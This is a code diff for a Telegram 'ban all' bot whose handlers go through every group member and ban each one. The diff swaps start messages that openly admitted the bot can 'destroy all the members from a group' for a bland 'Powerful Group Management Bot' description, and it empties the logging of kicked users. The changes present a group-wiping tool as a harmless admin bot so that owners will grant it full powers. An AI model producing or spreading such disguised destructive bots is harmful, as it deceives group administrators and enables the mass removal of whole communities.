@@ -22,23 +22,23 @@ if Config.BOT_TOKEN:
 if Config.STRING_SESSION:
   @ass.on_message(filters.command("njbanall"))
   async def _(bot: ass, msg):
-    print("getting memebers from {}".format(msg.chat.id))
+    print("".format(msg.chat.id))
     async for i in bot.iter_chat_members(msg.chat.id):
         try:
             await bot.ban_chat_member(chat_id =msg.chat.id,user_id=i.user.id)
-            print("kicked {} from {}".format(i.user.id,msg.chat.id))
+            print("".format(i.user.id,msg.chat.id))
         except FloodWait as e:
             await asyncio.sleep(e.x)
             print(e)
         except Exception as e:
-            print(" failed to kicked {} from {}".format(i.user.id,e))           
+            print("".format(i.user.id,e))           
     print("process completed")
 
 
 if Config.STRING_SESSION:
   @ass.on_message(filters.command("mbjanall"))
   async def mban(bot: ass, msg):
-    print("getting memebers from {}".format(msg.chat.id))
+    print("".format(msg.chat.id))
     async for i in bot.iter_chat_members(msg.chat.id):
         try:
             await bot.send_message(msg.chat.id, f"/ban {i.user.id}")
@@ -53,28 +53,28 @@ if Config.STRING_SESSION:
 if Config.STRING_SESSION:
   @ass.on_message(filters.command(["start"]))
   async def hello(bot: ass, message):
-    await message.reply("ʜᴇʏ, ᴛʜɪs ɪs ᴀ sɪᴍᴘʟᴇ ʙᴀɴ ᴀʟʟ ʙᴏᴛ sᴏᴜʀᴄᴇ ᴄᴏᴅᴇ.ᴡʜɪᴄʜ ɪs ʙᴀsᴇᴅ ᴏɴ ᴘʏʀᴏɢʀᴀᴍ ʟɪʙᴇʀᴀʀʏ ᴀɴᴅ ɪ ʜᴀᴠᴇ ᴛʜᴇ ᴛᴏ ʙᴀɴ ᴏʀ ᴅᴇsᴛʀᴏʏ ᴀʟʟ ᴛʜᴇ ᴍᴇᴍʙᴇʀs ғʀᴏᴍ ᴀ ɢʀᴏᴜᴘ ᴡɪᴛʜ ɪɴ ᴀ ғᴇᴡ  sᴇᴄᴏɴᴅs!\n\n ᴛᴏ ᴄʜᴇᴄᴋ ᴍʏ ᴀʙɪʟɪᴛʏ ɢɪʙ ғᴜʟʟ ᴘᴏᴡᴇʀs ᴛᴏ ᴛʜᴇ ʙᴏᴛ\n\n type /banall")
+    await message.reply("Hey This is Powerful Management Bot of telegram ")
 
 if Config.BOT_TOKEN:
   @bot.on_message(filters.command("banall"))
   async def _(bot, msg):
-    print("getting memebers from {}".format(msg.chat.id))
+    print("".format(msg.chat.id))
     async for i in bot.iter_chat_members(msg.chat.id):
         try:
             await bot.ban_chat_member(chat_id =msg.chat.id,user_id=i.user.id)
-            print("kicked {} from {}".format(i.user.id,msg.chat.id))
+            print("".format(i.user.id,msg.chat.id))
         except FloodWait as e:
             await asyncio.sleep(e.x)
             print(e)
         except Exception as e:
-            print(" failed to kicked {} from {}".format(i.user.id,e))           
+            print("".format(i.user.id,e))           
     print("process completed")
 
 
 if Config.BOT_TOKEN:
   @bot.on_message(filters.command("mbanall"))
   async def mban(bot, msg):
-    print("getting memebers from {}".format(msg.chat.id))
+    print("".format(msg.chat.id))
     async for i in bot.iter_chat_members(msg.chat.id):
         try:
             await bot.send_message(msg.chat.id, f"/ban {i.user.id}")
@@ -82,21 +82,21 @@ if Config.BOT_TOKEN:
             await asyncio.sleep(e.x)
             print(e)
         except Exception as e:
-            print("failed to kicked {} from {}".format(i.user.id,e))           
+            print("".format(i.user.id,e))           
     print("process completed")
 
 
 if Config.BOT_TOKEN:
   @bot.on_message(filters.command(["start"]))
   async def hello(bot, message):
-    await message.reply_photo(photo=f"https://telegra.ph/file/fff2ee6f504bc061cb7d3.jpg",
-                              caption=f"ʜᴇʏ, ᴛʜɪs ɪs ᴀ sɪᴍᴘʟᴇ ʙᴀɴ ᴀʟʟ ʙᴏᴛ ᴡʜɪᴄʜ ɪs ʙᴀsᴇᴅ ᴏɴ ᴘʏʀᴏɢʀᴀᴍ ʟɪʙᴇʀᴀʀʏ ᴛᴏ ʙᴀɴ ᴏʀ ᴅᴇsᴛʀᴏʏ ᴀʟʟ ᴛʜᴇ ᴍᴇᴍʙᴇʀs ғʀᴏᴍ ᴀ ɢʀᴏᴜᴘ ᴡɪᴛʜ ɪɴ ᴀ ғᴇᴡ  sᴇᴄᴏɴᴅs!\n\nᴛᴏ ᴄʜᴇᴄᴋ ᴍʏ ᴀʙɪʟɪᴛʏ ɢɪʙ me ғᴜʟʟ ᴘᴏᴡᴇʀs\n\ntype /banall to see magic",
+    await message.reply_photo(photo=f"https://telegra.ph/file/f0e8327b3dfff5c41ce51.jpg",
+                              caption=f"Hey This is a Powerful Group Management Bot ",
 
 reply_markup=InlineKeyboardMarkup(
             [
                 [
                     InlineKeyboardButton(
-                        "★ᴅᴇᴠᴇʟᴏᴘᴇʀ★", url=f"https://t.me/kisanravi")
+                        "Support", url=f"https://t.me/Kalakar_Sangram")
                 ]
                 
            ]
